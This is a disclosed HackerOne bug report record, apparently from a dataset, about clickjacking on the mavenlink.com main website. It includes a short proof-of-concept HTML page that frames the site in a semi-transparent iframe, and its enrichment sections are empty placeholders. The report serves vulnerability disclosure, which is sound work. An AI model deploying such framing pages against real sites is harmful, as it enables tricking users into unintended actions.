---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '14631'
original_report_id: '14631'
title: Clickjacking at https://www.mavenlink.com/ main website
weakness: UI Redressing (Clickjacking)
team_handle: mavenlink
created_at: '2014-06-03T02:46:01.085Z'
disclosed_at: '2014-09-19T15:34:56.815Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 3
tags:
- hackerone
- ui-redressing-clickjacking
---

# Clickjacking at https://www.mavenlink.com/ main website

## Metadata

- HackerOne Report ID: 14631
- Weakness: UI Redressing (Clickjacking)
- Program: mavenlink
- Disclosed At: 2014-09-19T15:34:56.815Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hello , i found clickjacking on main webpage.
<html><head>
<title> CSRF testing </title>
<style>

frame {

opacity: 0.5;
border: none;
position: absolute;
top: 0px;
left: 0px;
z-index: 1000;
}
</style>
</head>
<body>
<script>
   window.onbeforeunload = function()
   {
      return " Do you want to leave ?";
   }
</script>
<p> site is vulnerable for clickjacking! by Vineet bhardwaj</p>
<iframe id="frame" width="100%" height="100%" src="https://www.mavenlink.com/"></iframe>
</body>
</html>


same as last bug but its on other domain.... and its valid too 
waiting for positive response....
thanks

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
